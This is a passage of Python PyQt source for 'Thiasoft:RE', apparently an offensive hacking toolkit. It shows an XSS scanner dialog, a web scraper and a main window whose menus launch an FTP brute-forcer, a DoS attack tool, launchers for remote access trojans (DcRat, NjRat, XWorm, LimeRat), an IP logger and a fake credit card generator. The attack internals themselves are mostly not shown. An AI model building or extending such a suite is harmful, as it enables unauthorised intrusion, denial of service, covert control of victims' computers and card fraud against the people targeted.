                        self.log_signal.emit(f"XSS vulnerability found in {base_url} with payload {payload}")
                    else:
                        self.log_signal.emit(f"No XSS vulnerability found in {base_url} with payload {payload}")
                except requests.RequestException as e:
                    self.log_signal.emit(f"Error scanning {base_url}: {e}")

class XSSScannerApp(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("XSS Scanner")
        self.setWindowIcon(QIcon('imgs/xss.png'))  
        self.setFixedSize(400, 300)

        layout = QVBoxLayout()

        self.icon_label = QLabel()
        pixmap = QPixmap('imgs/xss.png')  
        self.icon_label.setPixmap(pixmap)
        self.icon_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.icon_label)

        self.urls_entry = QLineEdit()
        self.urls_entry.setPlaceholderText("Enter target URLs (comma-separated)")
        layout.addWidget(self.urls_entry)

        self.scan_button = QPushButton("Start XSS Scan")
        self.scan_button.clicked.connect(self.start_scan)
        layout.addWidget(self.scan_button)

        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)

        self.setLayout(layout)

    def start_scan(self):
        urls = self.urls_entry.text()
        if not urls:
            QMessageBox.warning(self, "Error", "Please enter at least one URL")
            return

        target_urls = [url.strip() for url in urls.split(",") if url.strip()]
        if not target_urls:
            QMessageBox.warning(self, "Error", "Please enter valid URLs")
            return

        self.result_text.append("Starting XSS scan...")

        self.xss_thread = XSSScannerThread(target_urls)
        self.xss_thread.log_signal.connect(self.update_log)
        self.xss_thread.start()

    def update_log(self, message):
        self.result_text.append(message)

class WebScraper(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Web Scraper")
        self.setWindowIcon(QIcon('imgs/scraper.png'))
        self.setFixedSize(600, 400)
        layout = QVBoxLayout()
        
        self.url_entry = QLineEdit()
        self.url_entry.setPlaceholderText("Enter URL to scrape")
        layout.addWidget(self.url_entry)
        
        self.tag_entry = QLineEdit()
        self.tag_entry.setPlaceholderText("Enter HTML tag to find (e.g., 'h1', 'p')")
        layout.addWidget(self.tag_entry)
        
        self.scrape_button = QPushButton("Scrape")
        self.scrape_button.clicked.connect(self.scrape_website)
        layout.addWidget(self.scrape_button)
        
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)
        
        self.setLayout(layout)
    
    def scrape_website(self):
        url = self.url_entry.text()
        tag = self.tag_entry.text()
        
        if not url or not tag:
            QMessageBox.warning(self, "Error", "Please enter a URL and an HTML tag")
            return
        
        try:
            response = requests.get(url)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, 'html.parser')
            elements = soup.find_all(tag)
            results = "\n".join(element.get_text() for element in elements)
            self.result_text.setPlainText(results)
        except requests.RequestException as e:
            QMessageBox.critical(self, "Error", f"Failed to scrape {url}: {e}")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"An error occurred: {e}")

class InvestigatorTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('Thiasoft:RE')
        self.setGeometry(300, 300, 800, 600)
        self.setWindowIcon(QIcon('imgs/icon.png'))
        
        menubar = self.menuBar()
        
        #мейн меню
        mainMenu = menubar.addMenu('MAIN')
        
        showDialogAction = QAction(QIcon('imgs/telegram.png'), 'We on Telegram', self)
        showDialogAction.setShortcut('Ctrl+C')
        showDialogAction.triggered.connect(self.show_tg)
        mainMenu.addAction(showDialogAction)
        
        showDialogAction = QAction(QIcon('imgs/youtube.png'), 'We on YouTube', self)
        showDialogAction.setShortcut('Ctrl+Y')
        showDialogAction.triggered.connect(self.show_yt)
        mainMenu.addAction(showDialogAction)
        
        showDialogAction = QAction(QIcon('imgs/about.png'), 'About', self)
        showDialogAction.setShortcut('Ctrl+A')
        showDialogAction.triggered.connect(self.show_dialog)
        mainMenu.addAction(showDialogAction)
        
        exitAction = QAction(QIcon('imgs/exit.png'), 'Exit', self)
        exitAction.setShortcut('Ctrl+Q')
        exitAction.triggered.connect(self.close)
        mainMenu.addAction(exitAction)
        
        #МЕНЮ TOOL
        toolsMenu = menubar.addMenu('TOOLS')
        smtpAction = QAction(QIcon('imgs/smtp.png'), 'SMTP Mailer', self)
        smtpAction.setShortcut('Ctrl+M')
        smtpAction.triggered.connect(self.show_smtp_reporter)
        toolsMenu.addAction(smtpAction)
        
        smtpAction = QAction(QIcon('imgs/ftpcheck.png'), 'FTP BruteForce', self)
        smtpAction.setShortcut('Ctrl+B')
        smtpAction.triggered.connect(self.show_ftpcheck)
        toolsMenu.addAction(smtpAction)
        
        dosAction = QAction(QIcon('imgs/dos.png'), 'DoS Attack', self)
        dosAction.setShortcut('Ctrl+G')
        dosAction.triggered.connect(self.show_dos_tool)
        toolsMenu.addAction(dosAction)
        
        proxyAction = QAction(QIcon('imgs/proxy.png'), 'Proxy Scraper', self)
        proxyAction.setShortcut('Ctrl+P')
        proxyAction.triggered.connect(self.show_proxy_scraper)
        toolsMenu.addAction(proxyAction)

        scraperAction = QAction(QIcon('imgs/scraper.png'), 'Web Scraper', self)
        scraperAction.setShortcut('Ctrl+S')
        scraperAction.triggered.connect(self.show_web_scraper)
        toolsMenu.addAction(scraperAction)
        
        showDialogAction = QAction(QIcon('imgs/qtox.png'), 'QTox Install', self)
        showDialogAction.setShortcut('Ctrl+X')
        showDialogAction.triggered.connect(self.show_qtox)
        toolsMenu.addAction(showDialogAction)
        
        showDialogAction = QAction(QIcon('imgs/kadick.png'), 'KadickClient', self)
        showDialogAction.setShortcut('Ctrl+K')
        showDialogAction.triggered.connect(self.show_kadick)
        toolsMenu.addAction(showDialogAction)
        
        ratsMenu = menubar.addMenu('RATS')
        showDialogAction = QAction(QIcon('imgs/dcrat.png'), 'DcRat', self)
        showDialogAction.setShortcut('Ctrl+T')
        showDialogAction.triggered.connect(self.show_teleshadow)
        ratsMenu.addAction(showDialogAction)
        
        showDialogAction = QAction(QIcon('imgs/njrat.png'), 'NjRat', self)
        showDialogAction.setShortcut('Ctrl+J')
        showDialogAction.triggered.connect(self.show_njrat)
        ratsMenu.addAction(showDialogAction)
        
        showDialogAction = QAction(QIcon('imgs/xworm.png'), 'XWorm', self)
        showDialogAction.setShortcut('Ctrl+Z')
        showDialogAction.triggered.connect(self.show_xworm)
        ratsMenu.addAction(showDialogAction)
        
        showDialogAction = QAction(QIcon('imgs/limerat.png'), 'LimeRat', self)
        showDialogAction.setShortcut('Ctrl+E')
        showDialogAction.triggered.connect(self.show_eagly)
        ratsMenu.addAction(showDialogAction)
        
        ExploitToolsMenu = menubar.addMenu('SCAN')
        nmapAction = QAction(QIcon('imgs/nmap.png'), 'Nmap', self)
        nmapAction.setShortcut('Ctrl+N')
        nmapAction.triggered.connect(self.show_nmap_tool)
        ExploitToolsMenu.addAction(nmapAction)
        
        dosAction = QAction(QIcon('imgs/xss.png'), 'XSS Scan', self)
        dosAction.setShortcut('Ctrl+V')
        dosAction.triggered.connect(self.show_xss_tool)
        ExploitToolsMenu.addAction(dosAction)
        
        #осинт меню
        osintMenu = menubar.addMenu('OSINT')
        osintAction = QAction(QIcon('imgs/osint.png'), 'OSINT Framework', self)
        osintAction.setShortcut('Ctrl+O')
        osintAction.triggered.connect(self.open_osint_url)
        osintMenu.addAction(osintAction)
        
        ipLoggerAction = QAction(QIcon('imgs/iplogger.png'), 'IP Logger', self)
        ipLoggerAction.setShortcut('Ctrl+L')
        ipLoggerAction.triggered.connect(self.show_ip_logger)
        osintMenu.addAction(ipLoggerAction)
        
        ipInfoAction = QAction(QIcon('imgs/ipinfo.png'), 'IP Info', self)
        ipInfoAction.setShortcut('Ctrl+I')
        ipInfoAction.triggered.connect(self.show_ip_info)
        osintMenu.addAction(ipInfoAction)
        
        hlrAction = QAction(QIcon('imgs/hlr.png'), 'HLR Checker', self)
        hlrAction.setShortcut('Ctrl+H')
        hlrAction.triggered.connect(self.show_hlr_tool)
        osintMenu.addAction(hlrAction)
        
        osintDatabaseSearchAction = QAction(QIcon('imgs/osintsearch.png'), 'Database Search', self)
        osintDatabaseSearchAction.setShortcut('Ctrl+D')
        osintDatabaseSearchAction.triggered.connect(self.show_osint_database_search)
        osintMenu.addAction(osintDatabaseSearchAction)
        
        
        
        #социалочка
        additionalToolsMenu = menubar.addMenu('SOCIAL')
        randomPersonalityAction = QAction(QIcon('imgs/random_personality.png'), 'Random Personality Generator', self)
        randomPersonalityAction.setShortcut('Ctrl+R')
        randomPersonalityAction.triggered.connect(self.show_random_personality)
        additionalToolsMenu.addAction(randomPersonalityAction)
        
        user_agent_action = QAction(QIcon('imgs/useragent.png'), 'User-Agent Generator', self)
        user_agent_action.setShortcut('Ctrl+U')
        user_agent_action.triggered.connect(self.show_user_agent_generator)
        additionalToolsMenu.addAction(user_agent_action)
        
        fakeCardAction = QAction(QIcon('imgs/fakecard.png'), 'Fake Card Generator', self)
        fakeCardAction.setShortcut('Ctrl+F')
        fakeCardAction.triggered.connect(self.show_fake_card)
        additionalToolsMenu.addAction(fakeCardAction)

        auth_dialog = AuthenticationDialog()
        if auth_dialog.exec_() != QDialog.Accepted:
            sys.exit()

        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)

        self.web_animation = WebAnimation()
        layout = QVBoxLayout(self.central_widget)
        layout.addWidget(self.web_animation, stretch=1)

        self.show()

    def show_dialog(self):
        dialog = SimpleDialog('''Developer - @Xahrvs | Telegram - @thiasoft
                MADE WITH LOVE ❤️''')
        dialog.exec_()
        

    def show_smtp_reporter(self):
        smtp_reporter = SMTPReporter()
        smtp_reporter.exec_()

    def show_proxy_scraper(self):
        proxy_scraper = ProxyScraper()
        proxy_scraper.exec_()
        
    def show_njrat(self):
        njrat = NjratMain()
        njrat.launch_app()
    
    def show_eagly(self):
        eagly = Eagly()
        eagly.launch_app()
        
    def show_xworm(self):
        xworm = Xworm()
        xworm.launch_app()
    
    def show_teleshadow(self):
        teleshadow = TeleShadow()
        teleshadow.launch_app()
        
    def show_kadick(self):
        kadick = KadickRunner()
        kadick.run()  

        
    def show_user_agent_generator(self):
        user_agent_dialog = UserAgentGenerator()
        user_agent_dialog.exec_()
        
    def show_dos_tool(self):
        dos_tool = DoSTool()
        dos_tool.exec_()
        
    def show_xss_tool(self):
        xss_tool = XSSScannerApp()
        xss_tool.exec_()

    def show_nmap_tool(self):
        nmap_tool = NmapTool()
        nmap_tool.exec_()

    def open_osint_url(self):
        url = "https://osintframework.com/"
        QDesktopServices.openUrl(QUrl(url))
        
    def show_hlr_tool(self):
        url = "https://smsc.ru/testhlr/"
        QDesktopServices.openUrl(QUrl(url))

        
    def show_yt (self):
        url = "https://www.youtube.com/channel/UCMtPxuOaSZgoM4FXXM5yrzg"
        QDesktopServices.openUrl(QUrl(url))
        
    def show_tg (self):
        url = "https://t.me/thiasoft"
        QDesktopServices.openUrl(QUrl(url))
        
        
    def show_qtox(self):
        url = "https://github.com/qTox/qTox/releases/download/v1.17.6/setup-qtox-x86_64-release.exe"
        QDesktopServices.openUrl(QUrl(url))

# Я ХЗ ШО ЭТО ЗА ГОВНО, НЕ ЧИТАЙТЕ ЭТОТ КОД ПЖ

    def show_ip_logger(self):
        url = "https://iplogger.org/ru/location-tracker/"
        QDesktopServices.openUrl(QUrl(url))

    def show_ip_info(self):
        ip_info = IPInfo()
        ip_info.exec_()

    def show_osint_database_search(self):
        osint_database_search = OSINTDatabaseSearch()
        osint_database_search.exec_()
        
    def show_ftpcheck(self):
        ftpcheck = FTPChecker()
        ftpcheck.exec_()
        
        
    def show_web_scraper(self):
        web_scraper = WebScraper()
        web_scraper.exec_()

    def show_random_personality(self):
        personality = generate_personality()
        QMessageBox.information(self, "Random Personality", f"Name: {personality['name']}\nAge: {personality['age']}\nAddress: {personality['address']}")

    def show_fake_card(self):
        card = generate_fake_card()
        QMessageBox.information(self, "Fake Card", f"Type: {card['type']}\nNumber: {card['number']}\nExpiry Date: {card['expiry_date']}\nCVV: {card['cvv']}")

    def keyPressEvent(self, event):
        if event.key() == Qt.Key_F11:
            if self.isFullScreen():
                self.showNormal()
            else:
                self.showFullScreen()
        super().keyPressEvent(event)

#я ненавижу в себе все и в ненависти утопаю, а ты прекрасна словно сон, в который я случайно попадаю.
if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    palette = app.palette()
    palette.setColor(palette.Window, Qt.black)
    palette.setColor(palette.WindowText, Qt.white)
    palette.setColor(palette.Base, Qt.black)
    palette.setColor(palette.AlternateBase, Qt.gray)
    palette.setColor(palette.ToolTipBase, Qt.white)
    palette.setColor(palette.ToolTipText, Qt.white)
    palette.setColor(palette.Text, Qt.white)
    palette.setColor(palette.Button, Qt.black)
    palette.setColor(palette.ButtonText, Qt.white)
    palette.setColor(palette.BrightText, Qt.red)
    palette.setColor(palette.Highlight, Qt.blue)
    palette.setColor(palette.HighlightedText, Qt.black)
    app.setPalette(palette)
    mainWin = InvestigatorTool()
    sys.exit(app.exec_())
